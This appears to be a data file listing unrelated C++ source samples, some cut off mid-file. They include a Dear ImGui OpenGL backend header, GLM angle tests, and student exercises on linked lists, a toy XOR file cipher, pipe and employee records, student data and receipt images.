    "// dear imgui: Renderer Backend for modern OpenGL with shaders / programmatic pipeline\n// - Desktop GL: 2.x 3.x 4.x\n// - Embedded GL: ES 2.0 (WebGL 1.0), ES 3.0 (WebGL 2.0)\n// This needs to be used along with a Platform Backend (e.g. GLFW, SDL, Win32, custom..)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'GLuint' OpenGL texture identifier as void*/ImTextureID. Read the FAQ about ImTextureID!\n//  [x] Renderer: Large meshes support (64k+ vertices) with 16-bit indices (Desktop OpenGL only).\n\n// About WebGL/ES:\n// - You need to '#define IMGUI_IMPL_OPENGL_ES2' or '#define IMGUI_IMPL_OPENGL_ES3' to use WebGL or OpenGL ES.\n// - This is done automatically on iOS, Android and Emscripten targets.\n// - For other targets, the define needs to be visible from the imgui_impl_opengl3.cpp compilation unit. If unsure, define globally or in imconfig.h.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-06-28: OpenGL: ImGui_ImplOpenGL3_NewFrame() recreates font texture if it has been destroyed by ImGui_ImplOpenGL3_DestroyFontsTexture(). (#7748)\n//  2024-05-07: OpenGL: Update loader for Linux to support EGL/GLVND. (#7562)\n//  2024-04-16: OpenGL: Detect ES3 contexts on desktop based on version string, to e.g. avoid calling glPolygonMode() on them. (#7447)\n//  2024-01-09: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" and variants, fixing regression on distros missing a symlink.\n//  2023-11-08: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" instead of \"libGL.so.1\", accommodating for NetBSD systems having only \"libGL.so.3\" available. (#6983)\n//  2023-10-05: OpenGL: Rename symbols in our internal loader so that LTO compilation with another copy of gl3w is possible. (#6875, #6668, #4445)\n//  2023-06-20: OpenGL: Fixed erroneous use glGetIntegerv(GL_CONTEXT_PROFILE_MASK) on contexts lower than 3.2. (#6539, #6333)\n//  2023-05-09: OpenGL: Support for glBindSampler() backup/restore on ES3. (#6375)\n//  2023-04-18: OpenGL: Restore front and back polygon mode separately when supported by context. (#6333)\n//  2023-03-23: OpenGL: Properly restoring \"no shader program bound\" if it was the case prior to running the rendering function. (#6267, #6220, #6224)\n//  2023-03-15: OpenGL: Fixed GL loader crash when GL_VERSION returns NULL. (#6154, #4445, #3530)\n//  2023-03-06: OpenGL: Fixed restoration of a potentially deleted OpenGL program, by calling glIsProgram(). (#6220, #6224)\n//  2022-11-09: OpenGL: Reverted use of glBufferSubData(), too many corruptions issues + old issues seemingly can't be reproed with Intel drivers nowadays (revert 2021-12-15 and 2022-05-23 changes).\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-27: OpenGL: Added ability to '#define IMGUI_IMPL_OPENGL_DEBUG'.\n//  2022-05-23: OpenGL: Reworking 2021-12-15 \"Using buffer orphaning\" so it only happens on Intel GPU, seems to cause problems otherwise. (#4468, #4825, #4832, #5127).\n//  2022-05-13: OpenGL: Fixed state corruption on OpenGL ES 2.0 due to not preserving GL_ELEMENT_ARRAY_BUFFER_BINDING and vertex attribute states.\n//  2021-12-15: OpenGL: Using buffer orphaning + glBufferSubData(), seems to fix leaks with multi-viewports with some Intel HD drivers.\n//  2021-08-23: OpenGL: Fixed ES 3.0 shader (\"#version 300 es\") use normal precision floats to avoid wobbly rendering at HD resolutions.\n//  2021-08-19: OpenGL: Embed and use our own minimal GL loader (imgui_impl_opengl3_loader.h), removing requirement and support for third-party loader.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: OpenGL: Use OES_vertex_array extension on Emscripten + backup/restore current state.\n//  2021-06-21: OpenGL: Destroy individual vertex/fragment shader objects right after they are linked into the main shader.\n//  2021-05-24: OpenGL: Access GL_CLIP_ORIGIN when \"GL_ARB_clip_control\" extension is detected, inside of just OpenGL 4.5 version.\n//  2021-05-19: OpenGL: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-06: OpenGL: Don't try to read GL_CLIP_ORIGIN unless we're OpenGL 4.5 or greater.\n//  2021-02-18: OpenGL: Change blending equation to preserve alpha in output buffer.\n//  2021-01-03: OpenGL: Bac",
    "/*\u8bfe\u540e\u4e60\u98981.8-c\r\n\r\n                c.\r\n   \u5df2\u77e5head\u4e3a\u5355\u94fe\u8868\u7684\u8868\u5934\u6307\u9488\uff0c\u94fe\u8868\u4e2d\u5b58\u50a8\u7684\u90fd\u662f\u6574\u5f62\u6570\u636e\uff0c\u5b9e\u73b0\u4e0b\u5217\u8fd0\u7b97\u7684\u9012\u5f52\u7b97\u6cd5\uff1a\r\n                        i.\t\u6c42\u94fe\u8868\u4e2d\u7684\u6700\u5927\u503c\r\n                                int GetMax(Node* a)\r\n\r\n                        ii.\t\u6c42\u94fe\u8868\u4e2d\u7684\u7ed3\u70b9\u4e2a\u6570\r\n                                int GetNodeNum(Node* a)\r\n\r\n                        iii.\u6c42\u6240\u6709\u6574\u6570\u7684\u5e73\u5747\u503c\r\n                                double GetAvg(Node* a, int n)\r\n\r\n*/\r\n#include <iostream>\r\nusing namespace std;\r\nconst int MinNumber = -1000000;\r\nstruct Node {\r\n    Node(int x) {\r\n        value = x;\r\n        next = NULL;\r\n    }\r\n    int value;\r\n    Node* next;\r\n};\r\n/*\r\nTODO:\u6c42\u94fe\u8868\u4e2d\u7684\u6700\u5927\u503c,\u5e76\u8fd4\u56de\u3002\u5982\u679c\u94fe\u8868a\u4e3a\u7a7a\uff0c\u5219\u76f4\u63a5\u8fd4\u56deMinNumber\r\n*/\r\nint GetMax(Node* a) {\r\n    if (a == NULL) {\r\n        return MinNumber;\r\n    }\r\n    int max = a->value;\r\n    int restMax = GetMax(a->next);\r\n    return (max > restMax) ? max : restMax;\r\n}\r\n/*\r\nTODO:\u6c42\u94fe\u8868\u4e2d\u7684\u7ed3\u70b9\u4e2a\u6570\uff0c\u5e76\u8fd4\u56de\u4e2a\u6570\u3002\r\n */\r\nint GetNodeNum(Node* a) {\r\n    if (a == NULL) {\r\n        return 0;\r\n    }\r\n    return 1 + GetNodeNum(a->next);\r\n}\r\n/*\r\nTODO: \u6c42\u6240\u6709\u6574\u6570\u7684\u5e73\u5747\u503c\r\n*/\r\ndouble GetAvg(Node* a, int n) {\r\n    if (a == NULL) {\r\n        return 0;\r\n    }\r\n    double sum = a->value + GetAvg(a->next, n - 1) * (n - 1);\r\n    return sum / n;\r\n}\r\n\r\nint main() {\r\n    int count;\r\n    cin >> count;\r\n    Node *a = NULL, *p;\r\n    for (int i = 0; i < count; i++) {\r\n        int iValue;\r\n        cin >> iValue;\r\n        if (a == NULL) {\r\n            a = new Node(iValue);\r\n            p = a;\r\n        } else {\r\n            p->next = new Node(iValue);\r\n            p = p->next;\r\n        }\r\n    }\r\n    int max = GetMax(a);\r\n    int nodeNum = GetNodeNum(a);\r\n    double avg = GetAvg(a, nodeNum);\r\n    cout << \"\u6700\u5927\u503c\uff1a\" << max << endl;\r\n    cout << \"\u7ed3\u70b9\u4e2a\u6570\uff1a\" << nodeNum << endl;\r\n    cout << \"\u5e73\u5747\u503c\uff1a\" << avg << endl;\r\n}\r\n",
    "#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/gtc/constants.hpp>\n#include <glm/gtx/vector_angle.hpp>\n#include <limits>\n\nint test_angle()\n{\n\tint Error = 0;\n\t\n\tfloat AngleA = glm::angle(glm::vec2(1, 0), glm::normalize(glm::vec2(1, 1)));\n\tError += glm::epsilonEqual(AngleA, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\tfloat AngleB = glm::angle(glm::vec3(1, 0, 0), glm::normalize(glm::vec3(1, 1, 0)));\n\tError += glm::epsilonEqual(AngleB, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\tfloat AngleC = glm::angle(glm::vec4(1, 0, 0, 0), glm::normalize(glm::vec4(1, 1, 0, 0)));\n\tError += glm::epsilonEqual(AngleC, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_orientedAngle_vec2()\n{\n\tint Error = 0;\n\t\n\tfloat AngleA = glm::orientedAngle(glm::vec2(1, 0), glm::normalize(glm::vec2(1, 1)));\n\tError += glm::epsilonEqual(AngleA, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\tfloat AngleB = glm::orientedAngle(glm::vec2(0, 1), glm::normalize(glm::vec2(1, 1)));\n\tError += glm::epsilonEqual(AngleB, -glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\tfloat AngleC = glm::orientedAngle(glm::normalize(glm::vec2(1, 1)), glm::vec2(0, 1));\n\tError += glm::epsilonEqual(AngleC, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_orientedAngle_vec3()\n{\n\tint Error = 0;\n\t\n\tfloat AngleA = glm::orientedAngle(glm::vec3(1, 0, 0), glm::normalize(glm::vec3(1, 1, 0)), glm::vec3(0, 0, 1));\n\tError += glm::epsilonEqual(AngleA, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\tfloat AngleB = glm::orientedAngle(glm::vec3(0, 1, 0), glm::normalize(glm::vec3(1, 1, 0)), glm::vec3(0, 0, 1));\n\tError += glm::epsilonEqual(AngleB, -glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\tfloat AngleC = glm::orientedAngle(glm::normalize(glm::vec3(1, 1, 0)), glm::vec3(0, 1, 0), glm::vec3(0, 0, 1));\n\tError += glm::epsilonEqual(AngleC, glm::pi<float>() * 0.25f, 0.01f) ? 0 : 1;\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error(0);\n\t\n\tError += test_angle();\n\tError += test_orientedAngle_vec2();\n\tError += test_orientedAngle_vec3();\n\n\treturn Error;\n}\n\n\n",
    "#include <iostream>\n#include <string>\n#include <fstream>\n\nint main() {\n    std::ifstream archivoOriginal(\"hola_mundo_cifrado.txt\", std::ios::binary);\n    std::ofstream archivoCifrado(\"archivo_cifrado.txt\", std::ios::binary);\n    std::string contenidoArchivo;\n    char clave = ';';\n\n    if (!archivoOriginal.is_open()) {\n        std::cerr << \"No se pudo abrir el archivo original\" << std::endl;\n        return 1;\n    }\n\n    // Lee todo el contenido del archivo original\n    contenidoArchivo.assign((std::istreambuf_iterator<char>(archivoOriginal)),\n                            std::istreambuf_iterator<char>());\n\n    archivoOriginal.close();\n\n    if (!archivoCifrado.is_open()) {\n        std::cerr << \"No se pudo abrir el archivo de cifrado\" << std::endl;\n        return 1;\n    }\n\n    // Cifra el contenido del archivo\n    for (int k = 0; k < contenidoArchivo.size(); k++) {\n        archivoCifrado << static_cast<char>(contenidoArchivo[k] ^ clave);\n    }\n\n    archivoCifrado.close();\n\n    std::cout << \"Cifrado realizado con \u00e9xito\" << std::endl;\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <string>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Truba { // \u0441\u043e\u0437\u0434\u0435\u043c \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0443 \u0442\u0440\u0443\u0431\u044b \u0438 \u0435\u0435 \u0445\u0430\u0440\u0430\u043a\u0442\u0435\u0440\u0438\u0441\u0442\u0438\u043a\u0438: \u0438\u043c\u044f, \u0434\u043b\u0438\u043d\u0430, \u0434\u0438\u0430\u043c\u0435\u0442\u0440, \u0432 \u0440\u0435\u043c\u043e\u043d\u0442\u0435 \u0438\u043b\u0438 \u043d\u0435\u0442\n    string Name;\n    int Long;\n    int Diametr;\n    bool Remont = false;\n    string wrong0;\n    string wrong;\n    string wrong1;\n\n    void readT() { //\u0441\u043e\u0437\u0434\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0432\u0432\u043e\u0434\u0430 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0445\u0430\u0440\u0430\u043a\u0442\u0435\u0440\u0438\u0441\u0442\u0438\u043a\n        bool B = true;\n        \n        while (B) {\n            cout << \" Input name: \";\n            getline(cin >> Name, wrong0);\n            if (Name.find(' ') != string::npos || wrong0.length() != 0) {\n                cin.clear();\n                Name = Name + wrong0;\n            }\n\n            cout << \" Input length: \";\n            getline(cin >> Long, wrong);\n            \n            if (Long <= 0 || Long > 2147483646 ||(int(Long) != Long || (to_string(Long)).find(' ') != string::npos || wrong.length() != 0)) {\n                cout << \"Incorrect data (pls add a new pipe) \" << endl;\n                cin.clear();\n                cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                continue;\n            }\n\n            cout << \" Input diametr: \";\n            getline(cin >> Diametr, wrong1);\n            if (Diametr <= 0 || Diametr > 2147483646 || (int(Diametr) != Diametr) || (to_string(Diametr)).find(' ') != string::npos || wrong1.length() != 0) {\n                cout << \"Incorrect data (pls add a new pipe) \" << endl;\n                cin.clear();\n                cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                continue;\n            }\n            B = false;\n        }\n    }\n\n    void DisplayT() { //\u043f\u0440\u043e\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0443\u0441\u043b\u043e\u0432\u0438\u0435 \u0435\u0441\u043b\u0438 \u0434\u043b\u0438\u043d\u0430 \u0442\u0440\u0443\u0431\u044b <=0 \u0438 \u0434\u0438\u0430\u043c\u0435\u0442\u0440 <=0, \u0442\u043e \u0442\u0440\u0443\u0431\u044b \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \n        if (Long > 0 && Diametr > 0) {\n            cout << \"Pipe name: \" << Name\n                << \"  Pipe length: \" << Long\n                << \"  Pipe diametr: \" << Diametr\n                << \"  Repairing: \" << (Remont ? \"Yes\" : \"No\") << endl;   \n        }\n        else {\n            cout << \"There is no pipe or incorrect data (pls add a new pipe)\" << endl;\n        }\n    }\n\n    void EditionT() { // \u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0442\u0440\u0443\u0431\u044b\n        if (Long > 0 && Diametr > 0) {\n            Remont = not(Remont);\n            cout << \" Repairing: \" << (Remont ? \"Yes\" : \"No\") << endl;\n            \n        }\n        else {\n            cout << \"There is no pipe (pls add a new pipe)\";\n        }\n    }\n\n    void LoadingT() {\n        if (Long > 0 && Diametr > 0) {\n            \n            ofstream outFile(\"Truba.txt\");\n\n            if (!outFile) {\n                cerr << \"Openning file Error!\" << endl;\n            }\n\n            outFile << Name << endl;\n            outFile << Long << endl;\n            outFile << Diametr << endl;\n            outFile << Remont << endl;\n            outFile.close();\n\n            cout << \"Now data in file Truba.txt!\" << endl;\n        }\n        else {\n            cout << \"There is no pipe or incorrect data(pls add a new pipe)\" << endl;\n        }\n\n    }\n    bool stringToBool(const string& str) {\n        string lowerStr = str;\n        transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(), ::tolower); // \u041f\u0440\u0438\u0432\u043e\u0434\u0438\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u043a \u043d\u0438\u0436\u043d\u0435\u043c\u0443 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0443\n\n        if (lowerStr == \"1\") {\n            return true;\n        }\n        else if (lowerStr == \"0\") {\n            return false;\n        }\n        else {\n            throw invalid_argument(\"Not bool.\");\n        }\n    }\n\n    void UnloadingT() {\n        const char* filename = \"Truba.txt\";\n        ifstream file(filename);\n\n        if (file) {\n            cout << \"File \" << filename << \" is real.\" << endl;\n            cout << \"\\n\" << endl;\n            ifstream inFile(\"Truba.txt\");\n\n            if (!inFile) {\n                cerr << \"Openning file Error!\" << endl;\n            }\n\n            string line1, line2, line3;\n            bool B = true;\n\n            while (B) {\n                if (getline(inFile, Name)) {\n                    cout << \"Pipe name: \" << Name << endl;\n                }\n\n                try {\n                    (getline(inFile, line1));\n                    Long = stoi(line1);\n                    if (Long < 0 || Long > 2147483646 ) {\n                        cout << \"Pipe length: < 0 or Long > 2147483646\" << endl;\n                    }\n                    else {\n                        cout << \"Pipe length:\" << Long << endl;\n                    }\n                }\n                catch (const invalid_argument&) {\n                    cout << \"Pipe length: \\\"\" << line1 << \"\\\" is not int.\" << endl;\n                }\n                catch (const out_of_range& ) {\n                    cout << \"Pipe length: \\\"\" << line1 << \"\\\" not in limit of int.\" << endl;\n                }\n                \n                try {\n                    (getline(inFile, line2));\n                    Diametr = stoi(line2);\n                    if (Diametr < 0 || Diametr > 2147483646) {\n                        cout << \"Pipe diametr: < 0\" << endl;\n                    }\n                    else ",
    "#include <iostream>\n#include <string>\n#include <ctime>\n#include <cstdio>\n#include <cstring> \n#include \"receipt.h\" \n\n\n\nint main() {\n    //temporal buffer\n    char temp[30];\n\n    // File paths\n    const std::string imagePath = \"image/green.png\";\n    const std::string outputImagePath = \"image/new.png\";\n\n    // Initialize image and font objects\n    Image r(imagePath.c_str());\n    Font l(\"OpenSans-VariableFont_wdth,wght.ttf\", 25);\n\n    Receipt receipt;\n\n    // Input customer's detail\n    r.overlayText(receipt.customer.name.c_str(), l, 101, 620, 92, 154, 100, 255);\n    r.overlayText(receipt.customer.phone.c_str(), l, 101, 660, 0, 0, 0, 230);\n    r.overlayText(receipt.customer.address.c_str(), l, 101, 700, 0, 0, 0, 230);\n\n    // Input curret date\n    r.overlayText(receipt.currentdate.c_str(), l, 101, 490, 0, 0, 0, 230);\n\n    int yPadding = 940;\n    int spacing = 70;\n\n    // Input items\n    for (int i = 0; i < receipt.totalItems; i++)\n        {\n          r.overlayText(std::to_string((i + 1)).c_str(), l, 155, (yPadding + (spacing * i)), 0, 0, 0, 230);\n           r.overlayText(receipt.items[i].name.c_str(), l, 270, (yPadding + (spacing * i)), 0, 0, 0, 230);\n            r.overlayText(receipt.items[i].price.c_str(), l, 890, (yPadding + (spacing * i)), 0, 0, 0, 230);\n            r.overlayText(receipt.items[i].totalPrice.c_str(), l, 1145, (yPadding + (spacing * i)), 0, 0, 0, 230); \n        }\n\n    l.setSize(40);\n    sprintf(temp, \"Total:\\t#%s\",receipt.getMainPrice().c_str());\n    r.overlayText(temp, l, 890, 1490, 0, 0, 0, 230);\n\n    \n\n    // Save the resulting image\n\n    if (r.write(outputImagePath.c_str()))\n    {\n      printf(\"Image was written sucessfully \\n\");\n    }\n    else\n    {\n      printf(\"Image was not written sucessfully \\n\");\n    }\n    \n    \n\n    return 0;\n}\n",
    "//Kalp Mehta\n//CSCN73030\n//Assignment-2\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\n// Structure to hold student data (first name, last name)\nstruct STUDENT_DATA {\n    string firstName;\n    string lastName;\n};\n\n// Function to load student data from a text file into a vector\nvoid Load_StudentDataFile(vector<STUDENT_DATA>& students) {\n    ifstream inputFile(\"StudentData.txt\");  // Open the input file\n    string line;\n\n    // Read the file line by line\n    while (getline(inputFile, line)) {\n        size_t commaPos = line.find(',');  // Find the position of the comma separating first and last name\n        if (commaPos != string::npos) {\n            STUDENT_DATA student;\n            student.firstName = line.substr(0, commaPos);        // Extract first name\n            student.lastName = line.substr(commaPos + 1);        // Extract last name\n            students.push_back(student);                        // Add student data to the vector\n        }\n    }\n\n    inputFile.close();  // Close the file after reading\n}\n\n#ifdef _DEBUG\n// Function to print student data in debug mode\nvoid Debug_Print(const vector<STUDENT_DATA>& students) {\n    cout << \"DEBUG MODE: Student Information:\" << endl;\n    // Iterate through each student and print their details\n    for (const auto& student : students) {\n        cout << \"First Name: \" << student.firstName << \", Last Name: \" << student.lastName << endl;\n    }\n}\n#endif\n\n#ifdef PRE_RELEASE\n// Function to load email data from a text file into a vector\nvoid Load_EmailDataFile(vector<string>& emails) {\n    ifstream emailFile(\"StudentData_Emails.txt\");  // Open the email data file\n    string email;\n\n    // Read the file line by line and store each email in the vector\n    while (getline(emailFile, email)) {\n        emails.push_back(email);\n    }\n\n    emailFile.close();  // Close the email file after reading\n}\n\n// Function to print student data along with emails in pre-release mode\nvoid PreRelease_Print(const vector<STUDENT_DATA>& students, const vector<string>& emails) {\n    cout << \"PRE-RELEASE MODE: Student Information with Emails:\" << endl;\n    // Iterate through each student and print their details along with the corresponding email\n    for (size_t i = 0; i < students.size(); ++i) {\n        cout << \"First Name: \" << students[i].firstName << \", Last Name: \" << students[i].lastName;\n        if (i < emails.size()) {\n            cout << \", Email: \" << emails[i];\n        }\n        cout << endl;\n    }\n}\n#endif\n\nint main() {\n    vector<STUDENT_DATA> students;  // Vector to hold student data\n    Load_StudentDataFile(students); // Load student data from file\n\n#ifdef _DEBUG\n    Debug_Print(students);  // If in debug mode, it will print student information\n#endif\n\n#ifdef PRE_RELEASE\n    vector<string> emails;  // Vector to hold email data\n    Load_EmailDataFile(emails);  // Load email data from file\n    PreRelease_Print(students, emails);  // Print student data along with emails in pre-release mode\n#else\n    cout << \"Running standard version of the application.\" << endl;  // Default message for standard mode\n#endif\n\n    return 0;\n\n#ifdef PRE_RELEASE\n    // This code block would run in pre-release mode\n    std::cout << \"Running in Pre-Release mode\" << std::endl;\n#else\n    // This block would run in standard mode\n    std::cout << \"Running in Standard mode\" << std::endl;\n#endif\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <fstream>\n\nusing namespace std;\n\nstruct Employee {\n    string surname;\n    string name;\n    string phone;\n    double salary;\n};\n\n\nbool isValidPhone(const string& phone) {\n    if (phone.length() != 14 || phone[0] != '(' || phone[4] != ')' || phone[5] != ' ' || phone[9] != '-') {\n        return false;\n    }\n    for (int i = 1; i < 4; ++i) {\n        if (!isdigit(phone[i])) return false;\n    }\n    for (int i = 6; i < 9; ++i) {\n        if (!isdigit(phone[i])) return false;\n    }\n    for (int i = 10; i < 14; ++i) {\n        if (!isdigit(phone[i])) return false;\n    }\n    return true;\n}\n\nvoid displayMenu() {\n    setlocale(LC_ALL, \"Russian\");\n    cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e8\u00f2\u00e5 \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00e5:\\n\";\n    cout << \"1. \u00c7\u00e0\u00e3\u00f0\u00f3\u00e7\u00e8\u00f2\u00fc \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00e8\u00e7 \u00f4\u00e0\u00e9\u00eb\u00e0\\n\";\n    cout << \"2. \u00d1\u00ee\u00f5\u00f0\u00e0\u00ed\u00e8\u00f2\u00fc \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00e2 \u00f4\u00e0\u00e9\u00eb\\n\";\n    cout << \"3. \u00cf\u00ee\u00ea\u00e0\u00e7\u00e0\u00f2\u00fc \u00e2\u00f1\u00e5\u00f5 \u00f1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00ee\u00e2\\n\";\n    cout << \"4. \u00cd\u00e0\u00e9\u00f2\u00e8 \u00f1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00e0 \u00ef\u00ee \u00f4\u00e0\u00ec\u00e8\u00eb\u00e8\u00e8\\n\";\n    cout << \"5. \u00cd\u00e0\u00e9\u00f2\u00e8 \u00f1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00ee\u00e2 \u00ef\u00ee \u00e4\u00e8\u00e0\u00ef\u00e0\u00e7\u00ee\u00ed\u00f3 \u00e7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\\n\";\n    cout << \"6. \u00c4\u00ee\u00e1\u00e0\u00e2\u00e8\u00f2\u00fc \u00f1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00e0\\n\";\n    cout << \"7. \u00d3\u00e4\u00e0\u00eb\u00e8\u00f2\u00fc \u00f1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00e0\\n\";\n    cout << \"8. \u00ce\u00f2\u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00e0\u00f2\u00fc \u00ef\u00ee \u00f4\u00e0\u00ec\u00e8\u00eb\u00e8\u00e8\\n\";\n    cout << \"0. \u00c2\u00fb\u00e9\u00f2\u00e8\\n\";\n}\n\nvoid loadFromFile(vector<Employee>& employees, const string& filename) {\n    setlocale(LC_ALL, \"Russian\");\n    ifstream file(filename);\n    if (!file) {\n        cout << \"\u00cd\u00e5 \u00f3\u00e4\u00e0\u00eb\u00ee\u00f1\u00fc \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00fc \u00f4\u00e0\u00e9\u00eb!\\n\";\n        return;\n    }\n    employees.clear();\n    Employee temp;\n    while (file >> temp.surname >> temp.name >> temp.phone >> temp.salary) {\n        employees.push_back(temp);\n    }\n    file.close();\n    cout << \"\u00c4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00e7\u00e0\u00e3\u00f0\u00f3\u00e6\u00e5\u00ed\u00fb!\\n\";\n}\n\nvoid saveToFile(const vector<Employee>& employees, const string& filename) {\n    setlocale(LC_ALL, \"Russian\");\n    ofstream file(filename);\n    for (const auto& employee : employees) {\n        file << employee.surname << \" \" << employee.name << \" \" << employee.phone << \" \" << employee.salary << endl;\n    }\n    file.close();\n    cout << \"\u00c4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00f1\u00ee\u00f5\u00f0\u00e0\u00ed\u00e5\u00ed\u00fb!\\n\";\n}\n\nvoid displayEmployees(const vector<Employee>& employees) {\n    setlocale(LC_ALL, \"Russian\");\n    for (const auto& employee : employees) {\n        cout << employee.surname << \" \" << employee.name << \" \u00d2\u00e5\u00eb\u00e5\u00f4\u00ee\u00ed: \" << employee.phone << \" \u00c7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00e0: \" << employee.salary << endl;\n    }\n}\n\nvoid findBySurname(const vector<Employee>& employees, const string& surname) {\n    setlocale(LC_ALL, \"Russian\");\n    bool found = false;\n    for (const auto& employee : employees) {\n        if (employee.surname == surname) {\n            cout << employee.surname << \" \" << employee.name << \" \u00d2\u00e5\u00eb\u00e5\u00f4\u00ee\u00ed: \" << employee.phone << \" \u00c7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00e0: \" << employee.salary << endl;\n            found = true;\n        }\n    }\n    if (!found) {\n        cout << \"\u00d1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea \u00f1 \u00f4\u00e0\u00ec\u00e8\u00eb\u00e8\u00e5\u00e9 \" << surname << \" \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed.\\n\";\n    }\n}\n\nvoid findBySalaryRange(const vector<Employee>& employees, double minSalary, double maxSalary) {\n    setlocale(LC_ALL, \"Russian\");\n    bool found = false;\n    for (const auto& employee : employees) {\n        if (employee.salary >= minSalary && employee.salary <= maxSalary) {\n            cout << employee.surname << \" \" << employee.name << \" \u00d2\u00e5\u00eb\u00e5\u00f4\u00ee\u00ed: \" << employee.phone << \" \u00c7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00e0: \" << employee.salary << endl;\n            found = true;\n        }\n    }\n    if (!found) {\n        cout << \"\u00d1\u00ee\u00f2\u00f0\u00f3\u00e4\u00ed\u00e8\u00ea\u00ee\u00e2 \u00f1 \u00e7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00ee\u00e9 \u00e2 \u00e4\u00e8\u00e0\u00ef\u00e0\u00e7\u00ee\u00ed\u00e5 \u00ee\u00f2 \" << minSalary << \" \u00e4\u00ee \" << maxSalary << \" \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\u00ee.\\n\";\n    }\n}\n\nvoid addEmployee(vector<Employee>& employees) {\n    setlocale(LC_ALL, \"Russian\");\n    Employee newEmployee;\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f4\u00e0\u00ec\u00e8\u00eb\u00e8\u00fe: \";\n    cin >> newEmployee.surname;\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e8\u00ec\u00ff: \";\n    cin >> newEmployee.name;\n    do {\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f2\u00e5\u00eb\u00e5\u00f4\u00ee\u00ed (\u00f4\u00ee\u00f0\u00ec\u00e0\u00f2 (XXX) XXX-XXXX): \";\n        cin >> newEmployee.phone;\n        if (!isValidPhone(newEmployee.phone)) {\n            cout << \"\u00cd\u00e5\u00ea\u00ee\u00f0\u00f0\u00e5\u00ea\u00f2\u00ed\u00fb\u00e9 \u00f4\u00ee\u00f0\u00ec\u00e0\u00f2 \u00f2\u00e5\u00eb\u00e5\u00f4\u00ee\u00ed\u00e0. \u00cf\u00ee\u00ef\u00f0\u00ee\u00e1\u00f3\u00e9\u00f2\u00e5 \u00f1\u00ed\u00ee\u00e2\u00e0.\\n\";\n        }\n    } while (!isValidPhone(newEmployee.phone));\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00f3: \";\n    cin >> newEmployee.salary;\n    employees.push_back(newEmployee);\n}\n\nvoid deleteEmployee(vector<Employee>& employees, const string& surname) {\n    setlocale(LC_ALL, \"Russian\");\n    for (auto it = 